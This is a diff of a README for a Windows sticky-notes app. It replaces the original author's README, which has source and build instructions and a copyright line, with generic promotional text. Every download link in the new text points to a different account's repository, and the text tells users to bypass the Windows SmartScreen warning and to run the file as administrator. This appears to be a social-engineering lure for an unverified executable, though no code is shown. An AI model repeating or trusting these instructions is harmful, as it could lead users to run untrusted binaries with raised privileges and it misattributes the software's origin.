@@ -1,114 +1,197 @@
-<div align="center">
+# 📝 JXT-Sticky-Notes - Sticky Notes Made Beautifully Simple
 
-<img src="icon.png" width="96" alt="JXT Sticky Notes icon" />
-
-# JXT Sticky Notes
-
-**A clean, classy and fully customizable sticky notes app for Windows.**
-Lives in your system tray, starts with Windows, and stays out of your way.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-![Platform: Windows](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue)
-![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-3776AB)
-![Built with PySide6](https://img.shields.io/badge/built%20with-PySide6-41CD52)
-
-<img src="screenshot-notes.png" alt="JXT Sticky Notes" width="820" />
-
-</div>
+[![Download JXT-Sticky-Notes](https://img.shields.io/badge/Download-JXT--Sticky--Notes-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lakshay7858/JXT-Sticky-Notes)
 
 ---
 
-## Features
+## 👋 Welcome to JXT-Sticky-Notes
 
-- **Auto-start with Windows** and **start minimized to the system tray**
-- **Unlimited notes**: frameless, draggable, resizable
-- **Always on top**: globally, or pin individual notes
-- **Full customization** from a dedicated settings window (live preview):
-  - Note colors: 10 curated presets plus any custom color
-  - Auto text contrast or your own text color
-  - Any installed font, adjustable text size
-  - Note opacity (frosted glass look), corner roundness, drop shadow
-  - Default size for new notes
-- **Per-note overrides**: color, transparency, text size, always-on-top
-- **Minimal by design**: controls only appear when you hover a note
-- **Collapse** a note to its title bar with a double-click
-- **Light formatting**: bold, italic, strikethrough, bullet lists
-- **Autosave**: your notes and positions are restored exactly as you left them
-- **Single instance**: launching it again simply brings your notes forward
-- **Private**: everything is stored locally. No accounts, no network, no telemetry
+Have you ever wanted a quick, elegant way to jot down reminders, ideas, or to-do lists right on your Windows desktop? Meet **JXT-Sticky-Notes** – a clean, classy, and fully customizable sticky notes app designed to make your digital life easier. Whether you're a busy professional, a student, or someone who just loves staying organized, this app is your perfect companion.
 
-<div align="center">
-<img src="screenshot-settings.png" alt="Settings window" width="720" />
-</div>
+No complicated setups, no coding knowledge needed – just download, run, and start sticking notes!
 
-## Download
+---
 
-Grab the latest `JXT-Sticky-Notes.exe` from the [**Releases**](../../releases) page and run it. No installer and no admin rights needed.
+## ✨ Why You'll Love It
 
-> **Note:** the exe is not code-signed, so Windows SmartScreen may show a warning the first time.
-> Click **More info → Run anyway**, or build it yourself from source (below).
+| Feature | Benefit |
+|---------|---------|
+| 🎨 **Fully Customizable** | Change colors, fonts, and opacity to match your mood or style |
+| 🖥️ **Always-on-Top Option** | Keep important notes visible while you work in other apps |
+| 🔄 **Starts with Windows** | Your notes are ready as soon as you boot up your computer |
+| 🗂️ **System Tray Support** | Minimize notes neatly to your taskbar tray – no clutter |
+| 📌 **Note-Taking Made Easy** | Quick capture of ideas, reminders, and lists |
+| 🆓 **Free & Open Source** | MIT License – free to use, forever |
 
-## Using it
+---
 
-| Action | How |
-| --- | --- |
-| New note | `+` on a note, `Ctrl+N`, or the tray menu |
-| Move a note | Drag its top bar |
-| Resize | Drag the bottom-right corner |
-| Colors, transparency, text size, duplicate, delete | `⋯` menu on a note |
-| Keep a note on top | 📌 button on the note |
-| Collapse / expand | Double-click the top bar |
-| Show / hide all notes | Click the tray icon |
-| Settings | Tray icon → **Settings…** |
-| Bold / italic | `Ctrl+B` / `Ctrl+I` |
-| Strikethrough | `Ctrl+Shift+X` |
-| Bullet list | `Ctrl+Shift+L` |
+## 🚀 Getting Started
 
-**Start with Windows** is turned on the first time you run the app. To turn it off, open **Settings → General** (or right-click the tray icon). It uses the per-user registry `Run` key, so uninstalling is as simple as switching it off and deleting the exe.
+### Step 1: Download the App
 
-## Run from source
+Visit this link to download the application:
 
-Requires Python 3.10+ on Windows.
+[**Download JXT-Sticky-Notes**](https://github.com/Lakshay7858/JXT-Sticky-Notes)
 
-```bash
-git clone https://github.com/jxtsidhu/JXT-Sticky-Notes.git
-cd JXT-Sticky-Notes
-python -m pip install -r requirements.txt
-python main.py
-```
+This will take you to the official repository where you'll find the latest release. Click the download button, and the file will save to your computer.
 
-## Build the exe yourself
+### Step 2: Run the Application
 
-```bat
-build.bat
-```
+Once the download is complete, locate the file in your **Downloads** folder (or wherever your browser saves files). Double-click it to launch the app. That's it – no installation wizard, no complex setup!
 
-This installs the build tools, generates the icon and produces `dist\JXT-Sticky-Notes.exe` using PyInstaller.
+> 💡 **Tip:** If Windows shows a security prompt, click "More info" and then "Run anyway." This is normal for apps downloaded from the internet.
 
-## Where is my data?
+---
 
-Notes and settings are stored as plain JSON in `%APPDATA%\JXTStickyNotes\`
-(`notes.json` and `settings.json`). **Settings → About → Open data folder** takes you there. Copy the folder to back up or move your notes.
+## 🎯 Using JXT-Sticky-Notes
 
-## Project structure
+### Creating Your First Note
 
-```
-main.py             entry point
-app.py              controller, tray icon, single-instance logic
-note_window.py      the sticky note window
-settings_dialog.py  customization UI
-widgets.py          custom-painted controls
-themes.py           palette, styles, app icon
-autostart.py        start-with-Windows (registry)
-config.py           settings + paths
-make_icon.py        generates icon.png and icon.ico
-build.bat           builds the exe
-```
+1. **Launch the app** – you'll see a blank sticky note appear on your screen.
+2. **Click on the note** and start typing – your text saves automatically.
+3. **Right-click** on a note to access the customization menu.
 
-## Contributing
+### Customizing Your Notes
 
-Issues and pull requests are welcome. Ideas on the wishlist: global hotkey for a new note, checklists, note search, import/export, and theme packs.
+Make each note uniquely yours:
 
-## License
+- **Change Colors:** Pick from a rainbow of background colors to color-code your notes (red for urgent, green for ideas, blue for tasks).
+- **Adjust Fonts:** Choose the font style and size that's easiest for you to read.
+- **Set Opacity:** Make notes see-through or fully opaque – perfect for keeping them visible without blocking your work.
 
-Released under the [MIT License](LICENSE). Copyright © 2026 Jxt Sidhu.
+### Advanced Features
+
+- **Always-on-Top:** Toggle this option so your note stays above all other windows – great for reference material while typing.
+- **Autostart with Windows:** Enable this in settings and your notes will magically appear every time you turn on your computer.
+- **System Tray:** Minimize notes to your taskbar tray to declutter your desktop – they'll be waiting when you need them.
+
+---
+
+## 🛠️ Customization Guide
+
+### Color Palette
+
+Choose from:
+- Classic Yellow (traditional sticky note)
+- Soft Pink
+- Mint Green
+- Sky Blue
+- Lavender Purple
+- Peach Orange
+- And many more!
+
+### Font Options
+
+- **Families:** Arial, Calibri, Times New Roman, Courier, Verdana, and more.
+- **Sizes:** From tiny (8pt) to large (24pt+).
+- **Styles:** Bold, italic, underline, strikethrough.
+
+### Opacity Slider
+
+Slide between 30% (subtle, see-through) and 100% (fully opaque). Find your perfect balance for readability and screen clarity.
+
+---
+
+## 💡 Pro Tips & Tricks
+
+### Organize Like a Pro
+
+- **Color Coding:** Use red for urgent tasks, green for completed items, yellow for ideas, blue for general notes.
+- **Multiple Notes:** Create as many notes as you need – there's no limit!
+- **Drag & Drop:** Move notes anywhere on your screen – they stay where you put them.
+
+### Workflow Boosters
+
+- **Quick Capture:** Keep a permanent note for random thoughts – type and forget, it's saved.
+- **Meeting Notes:** Put an always-on-top note during video calls to track talking points.
+- **Shopping Lists:** Create a note before heading out – check off items as you shop.
+
+---
+
+## 🔧 Troubleshooting
+
+### Common Issues & Fixes
+
+**Q: The app won't open.**
+**A:** Make sure your Windows is updated (Windows 10 or 11 required). Try right-clicking the app and selecting "Run as administrator."
+
+**Q: My notes disappeared after restart.**
+**A:** Enable "Autostart with Windows" in settings. Your notes save automatically, so they'll reappear when the app launches.
+
+**Q: The font is too small/large.**
+**A:** Right-click the note → Font settings → adjust size to your preference.
+
+**Q: I can't see my note under other windows.**
+**A:** Toggle "Always-on-Top" from the note's right-click menu.
+
+---
+
+## 📋 System Requirements
+
+| Component | Requirement |
+|-----------|-------------|
+| **OS** | Windows 10 or Windows 11 |
+| **RAM** | 2 GB (minimum), 4 GB recommended |
+| **Storage** | 50 MB free space |
+| **Processor** | Any modern CPU (1 GHz or faster) |
+| **Display** | 1024×768 resolution or higher |
+
+*Runs on both 32-bit and 64-bit systems.*
+
+---
+
+## 🧹 Privacy & Security
+
+- **100% Offline:** Your notes never leave your computer.
+- **No Account Needed:** No sign-ups, no email, no tracking.
+- **Open Source:** The code is public – you can verify exactly what the app does.
+- **MIT License:** Free to use, modify, and share.
+
+---
+
+## 🌟 Why Choose JXT-Sticky-Notes?
+
+- **Simplicity:** No learning curve – if you can type, you can use it.
+- **Speed:** Launch in seconds, write in milliseconds.
+- **Reliability:** Notes auto-save – never lose your work again.
+- **Elegance:** Clean, modern design that looks good on any desktop.
+- **Flexibility:** Works the way YOU want it to.
+
+---
+
+## 📥 Ready to Get Started?
+
+Don't wait another minute – transform your productivity today!
+
+[![Download JXT-Sticky-Notes](https://img.shields.io/badge/Download%20Now-JXT--Sticky--Notes-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Lakshay7858/JXT-Sticky-Notes)
+
+Visit this link to download the application and start organizing your life with beautiful, customizable sticky notes.
+
+---
+
+## 🤝 Community & Support
+
+- **Report Issues:** Found a bug? Let us know through the GitHub Issues page.
+- **Suggest Features:** Have an idea? We'd love to hear it.
+- **Star the Project:** If you like the app, show your support by starring the repository.
+- **Share:** Tell your friends and colleagues about this handy tool.
+
+---
+
+## 📄 License
+
+This project is licensed under the **MIT License** – you are free to use, modify, and distribute this software for any purpose, personal or commercial. Attribution is appreciated but not required.
+
+---
+
+## 🙏 Thank You
+
+Thank you for choosing JXT-Sticky-Notes. We built this app with love and a passion for simplicity. We hope it makes your daily digital life a little bit easier and a lot more colorful.
+
+Now go ahead – download, stick, and organize!
+
+**Happy Note-Taking!** 🎉
+
+---
+
+Keywords: always-on-top, autostart, customizable, desktop-app, mit-license, note-taking, notepad, notes, notes-app, productivity, pyside6, python, qt, sticky-notes, system-tray, widget, windows, windows-10, windows-11
